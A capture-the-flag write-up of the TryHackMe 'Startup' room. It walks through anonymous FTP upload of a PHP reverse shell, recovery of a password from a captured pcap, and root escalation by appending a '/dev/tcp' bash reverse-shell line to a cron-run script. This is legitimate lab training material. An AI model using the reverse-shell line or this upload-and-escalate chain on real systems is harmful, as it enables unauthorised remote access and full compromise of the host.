# [TryHackMe - Startup](https://tryhackme.com/room/startup)
- Author: [Thomas Cooke](http://github.com/tomrobertcooke)
<br>

## Challenge description:

> **Difficulty:** Easy<br>
> **Points:** 90<br>
> **Time Estimate:** 45 minutes<br>
> **Assignment:**
> *Spice Hut* has assigned me with conducting a penetration test to try to own root, citing rising security concerns and a lack of confidence in their web developers. They requested that I find 3 flags.<br>
> **Flag 1:** What is the *secret spicy soup recipe?*<br>
> **Flag 2:** What are the contents of `user.txt`?<br>
> **Flag 3:** What are the contents of `root.txt`?<br>

<br>


## Write Up

I started out by just visiting their site in a web browser.

<img width="668" height="288" alt="homepage" src="https://github.com/user-attachments/assets/e3a02b74-e455-47aa-83ac-9c3caf4c1f03" />

At first glance they're just hosting a minimal site with a placeholder homepage. There isn't much information to gather here even after looking at the source code.



From there I started enumerating open ports and services with `nmap`.

<img width="910" height="735" alt="nmap" src="https://github.com/user-attachments/assets/27bb3552-9727-4db8-a843-23be4fb220fa" />

`FTP anon: Anonymous FTP login allowed` seemed very promising, especially combined with the writeable directory `ftp`.



<img width="647" height="485" alt="ftp recon" src="https://github.com/user-attachments/assets/d4d52675-7c0e-43fd-8024-f100caa19974" />

Now that I had a way to upload files onto their network, I wanted to see if there was any chance of running a web shell. I tried a few different urls looking for directory traversal, but wasn't getting anywhere, so I decided to run it through `dirb`.

<img width="610" height="525" alt="dirb" src="https://github.com/user-attachments/assets/8c341f2b-505f-4473-be4a-630810678430" />

The `files` directory being listable made this very easy to check if I could reach the `ftp` folder.

<img width="448" height="301" alt="listable" src="https://github.com/user-attachments/assets/c0386ef7-03d4-4306-8647-0988ad0d17b2" />



All I had to do at this point was get a web shell, like PentestMonkey's [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell), insert my listening port and ip address, and upload it to the `files/ftp` folder.

<img width="1920" height="461" alt="ftp put" src="https://github.com/user-attachments/assets/d6be11e0-984c-4378-a676-4887c83f8620" />

Then all I had to do was listen for it with `nc -lnvp <PORT>`, and `curl http://<TARGET-IP-ADDRESS>/files/ftp/shell.php` to send it out.

<img width="1244" height="523" alt="www-data shell" src="https://github.com/user-attachments/assets/d2daf7f4-15bd-48eb-a842-7fa3767c4095" />

I got a reverse shell on the web server! Not only that, but the root directory had `recipe.txt`, which contained the first flag.


---


To start out, I read the contents of `/etc/passwd` and looked around the `/home` directory to see what other users were on the system. 

<img width="786" height="124" alt="etc/passwd" src="https://github.com/user-attachments/assets/07c39a85-9dea-4074-96dc-77c1e1a2cfc6" />



The only user I could find other than root was *lennie,* and I didn't have permissions to look in his home directory.

Based on what I had already seen, one thing stood out, that `incidents` directory in `/`. It contained a file called `suspicious.pcapng`. I decided to download it to my machine using python's `http.server` module for analysis.

<img width="765" height="174" alt="send pcap" src="https://github.com/user-attachments/assets/3ef8a0ac-ea4e-4715-8339-b12f4da4acea" />

<img width="941" height="215" alt="download pcap" src="https://github.com/user-attachments/assets/12a9d084-deeb-4eb0-bab7-38de7d1096f2" />




With Tshark I was able to get some good information out of it. Because this is a web server, I decided to filter for "http" first and found a suspicious request.

<img width="850" height="152" alt="suspicious http" src="https://github.com/user-attachments/assets/4e74d84d-d275-4842-9696-41f423e14063" />

Right off the bat we can see that someone else has done something similar to me and uploaded some kind of shell to the `ftp` directory.

I started following different TCP streams to see what I could find. This is what I was able to find when I used `sudo tshark -r suspicious.pcapng -z "follow, tcp, ascii, 2"` to follow TCP stream 2.

```
Follow: tcp,ascii
Filter: tcp.stream eq 2
Node 0: 192.168.33.1:48974
Node 1: 192.168.33.10:80
```

...

```
375
GET /files/ftp/shell.php HTTP/1.1
Host: 192.168.33.10
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```


I found their actual shell in stream 7 with `sudo tshark -r suspicious.pcapng -z "follow,tcp,ascii,7"`

```
Follow: tcp,ascii
Filter: tcp.stream eq 7
Node 0: 192.168.22.139:40934
Node 1: 192.168.22.139:4444
108
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

200
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash

54
uid=33(www-data) gid=33(www-data) groups=33(www-data)

12
/bin/sh: 0: 
43
can't access tty; job control turned off
$ 
```

In their reverse shell, they were signed in as `www-data` like me, looked at `/etc/passwd`, tried to access `/root` and `/home/lennie`, and even tried to `sudo -l` to check for `sudo` privileges. In their attempts to log into `www-data`, however, they used a credential that I hadn't seen before.

```
www-data@startup:/home$ 
	8
sudo -l

9
sudo -l

30
[sudo] password for www-data: 
	19
c4ntg3t3n0ughsp1c3

2


17
Sorry, try again.
```

After all of that, it appears that they just gave up and exited. I decided to try to use that password to log as `lennie`.

<img width="490" height="142" alt="su lennie" src="https://github.com/user-attachments/assets/0b2b282b-63bf-476a-a71c-ccfd9c9cfcae" />

It worked! From there I went into lennie's home directory to see what I could find, and flag 2 was right there!

<img width="492" height="250" alt="flag 2" src="https://github.com/user-attachments/assets/9614ccc8-aed9-4b6c-9173-888a30e43a47" />

---

Now my next goal was to see if I could find a way into a root shell with lennie's privileges.

<img width="442" height="117" alt="sudoers" src="https://github.com/user-attachments/assets/3d231b28-5c4f-432c-beda-1f596cf4a48f" />

Sadly, lennie isn't in `sudoers`, so I was going to have to find another way in. There weren't any useful binaries that could be ran with the `suid` bit set either. I also didn't see any scheduled jobs in `/etc/crontab`.

Next I looked into lennie's scripts folder. Luckily lennie's had read privileges for both files, but only root could write to either of them.

<img width="505" height="101" alt="scripts" src="https://github.com/user-attachments/assets/26dabe6a-ab36-44bb-9f02-6d54cc222a80" />



`startup_list.txt` was empty, and `Planner.sh` looked like this:

``` bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```



Jackpot! Lennie has write permissions to `/etc/print.sh`!

<img width="516" height="61" alt="print.sh" src="https://github.com/user-attachments/assets/a18e7493-a748-4dcc-936f-274d3b5dd0a3" />

``` bash
#!/bin/bash
echo "Done!"
```



As long as someone ran this script, I would be able to spawn myself a reverse shell. I added a line to do just that.

``` bash
#!/bin/bash
echo "Done!"
bash -i >& /dev/tcp/192.168.226.246/8081 0>&1
```



I was also able to confirm that this script was being ran every minute by looking at the timestamps on `startup_list.txt`.

<img width="538" height="325" alt="script timing" src="https://github.com/user-attachments/assets/06271d32-097e-4813-9321-6bb6418565fc" />


I set up a `netcat` listener on port 8081 to see what I could get, and I got a reverse shell as root! It started me out in `/root`, so I looked for `root.txt` and got the third flag right then and there!

<img width="794" height="439" alt="flag3" src="https://github.com/user-attachments/assets/af547515-f1ee-4478-b685-4b4505b2ac07" />


